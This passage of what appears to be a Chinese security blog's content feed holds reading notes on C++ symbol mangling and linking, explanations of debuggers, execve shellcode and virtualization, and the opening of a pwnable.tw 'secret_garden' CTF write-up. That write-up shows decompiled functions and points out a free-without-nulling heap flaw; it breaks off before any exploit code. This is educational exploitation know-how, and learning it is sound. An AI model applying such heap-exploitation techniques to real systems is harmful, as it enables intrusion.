class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">func</span><span class="params">(<span class="keyword">float</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> &#123;</span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">C2</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> N &#123;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">C</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中有6个同名函数叫func，只不过它们的返回类型和参数及所在的名称空间不同。我们引入一个术语叫做<strong>函数签名（Function Signature）</strong>，函数签名包含了一个函数的各种信息，包括函数名、它的参数类型、它所在的类和名称空间及其他信息。</p><p>在编译器及链接器处理符号时，它们采用某种<strong>名称修饰</strong>的方法，使得每个函数签名对应一个<strong>修饰后名称（Decorated Name）</strong>。c++编译器和链接器都使用符号来识别和处理函数和变量，所以对于不同函数签名的函数，即使函数名相同，编译器和链接器也能区分它们。上面六个函数签名在gcc编译器下，相对应的修饰后名称如图：</p><table><thead><tr><th>函数签名</th><th>修饰后名称（符号名）</th></tr></thead><tbody><tr><td>int func(int)</td><td>_Z4funci</td></tr><tr><td>float func(float)</td><td>_Z4funcf</td></tr><tr><td>int C::func(int)</td><td>_ZN1C4funcEi</td></tr><tr><td>int C::C2func(int)</td><td>_ZN1C2C24funcEi</td></tr><tr><td>int N::func(int)</td><td>_ZN1N4funcEi</td></tr><tr><td>int N::C::func(int)</td><td>_ZN1N1C4funcEi</td></tr></tbody></table><p>不同的编译器厂商的名称修饰方法可能不同</p><h2 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h2><p>c++为了和c兼容，在符号的管理上，c++有一个用来声明或定义一个c的符号的“extern“C””关键字用法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c++编译器会将在 extern “C” 的大括号内部的代码当作c语言代码处理，所以什么的代码中，c++的名称修饰机制将会不起作用。</p><p>如果单独声明某个函数或变量为c语言的符号，那么也可以使用如下格式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="keyword">int</span> var;</span><br></pre></td></tr></table></figure><h2 id="弱符号与强符号"><a href="#弱符号与强符号" class="headerlink" title="弱符号与强符号"></a>弱符号与强符号</h2><p>对于c/c++语言来说，编译器默认函数和初始化了的全局变量为<strong>强符号（Strong Symbol）</strong>，未初始化的全局变量为<strong>弱符号（Weak Symbol）</strong>。我们也可以通过GCC的<code>&quot;__attribute__((weak))&quot;</code>来定义任何一个强符号为弱符号，需要注意的是，强符号和弱符号都是针对定义来说的，不是针对符号的引用。例如下面的程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> ext;</span><br><span class="line"><span class="keyword">int</span> weak;</span><br><span class="line"><span class="keyword">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) weak2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段程序中，“weak”和“weak2”为弱符号，“strong”和“main”是强符号，而“ext”既非强符号也非弱符号，因为它是一个外部变量的引用。</p><p>针对强弱符号的概念，链接器或按如下规则处理与选择被多次定义的全局符号：</p><ol><li>不允许强符号被多次定义（即不同的目标文件中不能有同名的强符号）：如果有多个强符号定义，则链接器报符号重复定义错误。</li><li>如果一个符号在某个目标文件中是强符号，在其他文件中都是弱符号，那么选择强符号。</li><li>如果一个符号在所有目标文件中都是弱符号，那么选择其中占用空间最大的一个。比如目标文件A定义全局变量global为int型，占4个字节；目标文件B定义global为double型，占8个字节，那么目标文件A和B链接后，符号global占8个字节（尽量不要使用多个不同类型的弱符号，否则容易导致很难发现的程序错误）。</li></ol><h3 id="弱引用和强引用"><a href="#弱引用和强引用" class="headerlink" title="弱引用和强引用"></a>弱引用和强引用</h3><p>目前我们所看到的对外部目标文件的符号引用在目标文件被最终链接成可执行文件时，它们需要被正确决议，如果没有找到该符号的定义，链接器就会报符号未定义错误，这种被称为<strong>强引用（Strong Reference）</strong>，与之相对应的是<strong>弱引用（weak Reference）</strong>，和强引用的区别在于对于未定义的弱引用，编译器不认为它是一个错误，一般链接器会默认其为0，或者是一个特殊的值，以便于程序代码能够识别。</p><p>在gcc中，我们可以通过使用<code>&quot;__attribute__((weakref))&quot;</code>这个扩展关键字来声明对一个外部函数的引用为弱引用</p><h1 id="3-6-调试信息"><a href="#3-6-调试信息" class="headerlink" title="3.6 调试信息"></a>3.6 调试信息</h1><p>目标文件里面还可能保存的是调试信息，如果我们在gcc编译时加上“-g”参数，编译器就会在产生的目标文件里面加上调试信息。我们用readelf等工具可以看到，目标文件里多了很多“debug”相关的段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S SimpleSection</span><br><span class="line">...</span><br><span class="line">  [28] .debug_aranges    PROGBITS         0000000000000000  00001075</span><br><span class="line">       0000000000000030  0000000000000000           0     0     1</span><br><span class="line">  [29] .debug_info       PROGBITS         0000000000000000  000010a5</span><br><span class="line">       00000000000000ed  0000000000000000           0     0     1</span><br><span class="line">  [30] .debug_abbrev     PROGBITS         0000000000000000  00001192</span><br><span class="line">       0000000000000093  0000000000000000           0     0     1</span><br><span class="line">  [31] .debug_line       PROGBITS         0000000000000000  00001225</span><br><span class="line">       000000000000004a  0000000000000000           0     0     1</span><br><span class="line">  [32] .debug_str        PROGBITS         0000000000000000  0000126f</span><br><span class="line">       00000000000000b8  0000000000000001  MS       0     0     1</span><br><span class="line">  [33] .shstrtab         STRTAB           0000000000000000  00001cc7</span><br><span class="line">       000000000000014c  0000000000000000           0     0     1</span><br><span class="line">  [34] .symtab           SYMTAB           0000000000000000  00001328</span><br><span class="line">       0000000000000738  0000000000000018          35    54     8</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这些段中保存的就是调试信息，现在的ELF文件采用一个叫<strong>DWARF（Debug With Arbitrary Record Format）</strong>的标准的调试信息格式。</p><p>在linux下，我们可以使用“strip”命令来去掉elf文件中的调试信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$strip SimpleSection</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序员的自我修养 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制常用工具与技术的执行过程与原理</title>
      <link href="2020/12/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%8E%9F%E7%90%86/"/>
      <url>2020/12/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>今天面试被问傻了，感觉自己对不少技术的了解都还停留在表面，于是打算来更深入的理解一下工具和技术的具体执行过程和原理</p><h2 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h2><p>二进制漏洞的学习和分析过程中最常用就是各种调试工具</p><h3 id="静态调试"><a href="#静态调试" class="headerlink" title="静态调试"></a>静态调试</h3><p>ida通常被用于静态的反编译工具来查看程序</p><p>反编译扫描有两种方式，线性扫描和递归扫描</p><h4 id="线性扫描"><a href="#线性扫描" class="headerlink" title="线性扫描"></a>线性扫描</h4><p>所谓线性扫描就是从起始逐条反汇编指令，直到完成整个代码段，如gdb、windbg、objdump采用的就是线性扫描</p><h4 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h4><p>递归扫描就是根据一条指令是否被另一条指令引用来决定是否对其进行反汇编</p><ul><li>顺序流指令：直接解析它后面的下一条指令，如MOV、PUSH、POP</li><li>条件分支指令：解析它的所有条件路径，如JNZ</li><li>无条件分支指令：反汇编器会尝试定位到跳转的目标，但有可能失败（如JMP EAX,EAX在静态环境下无法确认)</li><li>函数调用指令：和无条件分支指令相似，如CALL EAX</li></ul><p>ida使用的就是递归扫描，这也是花指令可以作为对抗ida的手段的原理</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>最典型的应该就是使用ptrace来调试进程</p><h4 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h4><p>断点的执行过程是这样，当我们想在程序的某个地方断下来的时候，就把那个地方的值置为0xCC，0xCC对应的汇编指令是int 3，是专门用来调试的中断指令，然后再去执行子进程，当遇到断点时获取信号并恢复断点位置原有的指令。</p><p>实现可参考：<a href="http://researchcomplete.blogspot.com/2016/08/on-subject-of-debuggers-and-tracers_5.html" target="_blank" rel="noopener">http://researchcomplete.blogspot.com/2016/08/on-subject-of-debuggers-and-tracers_5.html</a></p><h4 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h4><p>gdb的watch命令可以实现对某个变量/内存地址的监控，如果监控的值被读/写，就会停住程序</p><p>实现watch point一般需要CPU支持硬件断点，软件实现非常消耗CPU</p><p>如果支持硬件断点，那么可以将监控的操作交给硬件来完成，而gdb这边只要做个简单的逻辑处理就行</p><p>如果是软件断点，在<a href="http://www.kgdb.info/gdb_watchpoint/" target="_blank" rel="noopener">gdb 和 watchpoint</a>中说的是设置watchpoint所在的那个页表为不可读/访问，然后在缺页处理那检测当前的页和地址是否是软设置watchpoint所在的页和watchpoint的地址，如果是，则可以假设该watchpoint发生了</p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><h3 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h3><p>在编写shellcode的时候，最常见的获取shell方式就是execve(/bin/sh)，execve系统调用的执行过程如下：</p><ol><li>陷入内核</li><li>加载新的可执行文件并进行可执行性检查</li><li>将新的可执行文件映射到当前运行进程的进程空间中，并覆盖原来的进程数据</li><li>将EIP的值设置为新的可执行程序的入口地址。如果可执行程序是静态链接的程序，或不需要其他的动态链接库，则新的入口地址就是新的可执行文件的main函数地址；如果可执行程序还需要其他的动态链接库，则入口地址是加载器ld的入口地址</li><li>返回用户态，程序从新的EIP出开始继续往下执行。至此，老进程的上下文已经被新的进程完全替代了，但是进程的PID还是原来的。从这个角度来看，新的运行进程中已经找不到原来的对execve调用的代码了，所以execve函数的一个特别之处是他从来不会成功返回，而总是实现了一次完全的变身。</li></ol><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one gadget"></a>one gadget</h3><p>简单来说就是找到所有的/bin/sh及其引用，然后通过符号执行寻找约束</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>qemu最主要的功能有两个：</p><ul><li>作为用户态模拟器：通过动态代码翻译机制来执行不同架构的代码，例如在X86平台上模拟ARM平台下执行环境。</li><li>作为虚拟机监视器：模拟全系统，利用其它VMM（Xen，KVM等等）来使用硬件提供的虚拟化支持，创建接近于主机性能的虚拟机。</li></ul><p>所谓动态代码翻译机制，简而言之就是把目标代码的指令解释为一条条的微操作，然后再转化成本机可以执行的指令</p><p>KVM是Linux内核的一个虚拟化特性，由一组内核模块文件组成，它可以让QEMU中运行的Guest OS的指令直接在Host OS上的CPU中执行，<strong>前提是Guest OS和Host OS的硬件架构相同</strong>。</p><p>KVM 本身不执行任何模拟，需要用户空间应用程序 QEMU 通过 /dev/kvm 接口设置一个客户机虚拟服务器的地址空间，向它提供模拟的 I/O，KVM 模块主要功能是初始化CPU硬件，打开虚拟化模式，然后将虚客户机运行在虚拟机模式下，并对虚拟客户机的运行提供一定的支持。在硬件虚拟化技术的支持下，内核的 KVM 模块与 QEMU 的设备模拟协同工作，构成一套和物理计算机系统完全一致的虚拟化计算机软硬件系统。</p><h3 id="docker与虚拟机"><a href="#docker与虚拟机" class="headerlink" title="docker与虚拟机"></a>docker与虚拟机</h3><h4 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h4><p>虚拟机是一种模拟系统，即在软件层面上通过模拟硬件的输入和输出，让虚拟机的操作系统得以运行在没有物理硬件的环境中（也就是宿主机的操作系统上）。其中，这个能够模拟出硬件输入输出，让虚拟机的操作系统可以启动起来的程序，被叫做hypervisor。</p><p>一般来说，虚拟机都会有自己的kernel，自己的硬件，这样虚拟机启动的时候需要先做开机自检，启动kernel，启动用户进程等一系列行为，虽然现在电脑运行速度挺快，但是这一系列检查做下来，也要几十秒，也就是虚拟机需要几十秒来启动。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%8E%9F%E7%90%86-1.jpg"  alt=""></p><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><p>宿主机和虚拟机的kernel是一致的（与虚拟机区别：不用做硬件输入输出的搬运工了，只需要做kernel输入输出的搬运工即可），这种虚拟机被命名为操作系统层虚拟化，也被叫做容器。<br>由于在虚拟机的系统中，虚拟机认为自己有独立的文件系统，进程系统，内存系统，等等一系列，所以为了让容器接近虚拟机，也需要有独立的文件系统，进程系统，内存系统，等等一系列，为了达成这一目的，宿主机系统采用的办法是：只要隔离容器不让它看到主机的文件系统，进程系统，内存系统，等等一系列，那么容器系统就是一个接近虚拟机的玩意了。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%8E%9F%E7%90%86-2.jpg"  alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-secret_garden-fastbin任意地址分配修改hook</title>
      <link href="2020/12/07/pwnable-tw-secret-garden-fastbin%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E4%BF%AE%E6%94%B9hook/"/>
      <url>2020/12/07/pwnable-tw-secret-garden-fastbin%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E4%BF%AE%E6%94%B9hook/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file secretgarden </span><br><span class="line">secretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;cc989aba681411cb235a53b6c5004923d557ab6a, stripped</span><br><span class="line">$ checksec secretgarden </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>64位elf，动态链接，去符号表，保护全开</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>添加，每朵花会malloc(0x28)来存储所有信息，会malloc任意大小来存储花名，所有花的堆块地址将放到bss段 的一个list中，最多能有100朵花</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *flower; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *flower_name; <span class="comment">// rbp</span></span><br><span class="line">  _QWORD *v2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>[<span class="number">9</span>]; <span class="comment">// [rsp+4h] [rbp-24h]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;<span class="built_in">size</span>[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">size</span>[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flower_num &gt; <span class="number">0x63</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"The garden is overflow"</span>);</span><br><span class="line">  flower = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  *flower = <span class="number">0L</span>L;</span><br><span class="line">  flower[<span class="number">1</span>] = <span class="number">0L</span>L;                              <span class="comment">// name</span></span><br><span class="line">  flower[<span class="number">2</span>] = <span class="number">0L</span>L;                              <span class="comment">// color</span></span><br><span class="line">  flower[<span class="number">3</span>] = <span class="number">0L</span>L;</span><br><span class="line">  flower[<span class="number">4</span>] = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Length of the name :"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_scanf(<span class="string">"%u"</span>, <span class="built_in">size</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  flower_name = <span class="built_in">malloc</span>(<span class="built_in">size</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !flower_name )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Alloca error !!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"The name of flower :"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, flower_name, <span class="built_in">size</span>[<span class="number">0</span>]);</span><br><span class="line">  flower[<span class="number">1</span>] = flower_name;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"The color of the flower :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%23s"</span>, flower + <span class="number">2</span>);</span><br><span class="line">  *(_DWORD *)flower = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flower_list[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = &amp;flower_list[<span class="number">1</span>];</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      ++v2;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">100</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  flower_list[v3] = flower;</span><br><span class="line">LABEL_14:</span><br><span class="line">  ++flower_num;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Successful !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p>遍历列表，打印花的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 show_num; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  show_num = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( flower_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = flower_list[show_num];</span><br><span class="line">      <span class="keyword">if</span> ( v1 &amp;&amp; *(_DWORD *)v1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = *(_QWORD *)(v1 + <span class="number">8</span>);</span><br><span class="line">        __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"Name of the flower[%u] :%s\n"</span>);</span><br><span class="line">        v3 = flower_list[show_num];</span><br><span class="line">        LODWORD(v1) = __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"Color of the flower[%u] :%s\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++show_num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( show_num != <span class="number">100</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">"No flower in the garden !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="del"><a href="#del" class="headerlink" title="del"></a>del</h3><p>删除花，并free掉存放name的堆块，但是并没有检查花的存在位，free后也没有将指针清0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !flower_num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No flower in the garden"</span>);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"Which flower do you want to remove from the garden:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x63</span> &amp;&amp; (v1 = (_DWORD *)flower_list[v2]) != <span class="number">0L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    *v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(flower_list[v2] + <span class="number">8L</span>L));</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><p>如果花已经被删除，则可以用clear功能free掉对应的那个0x28大小的堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 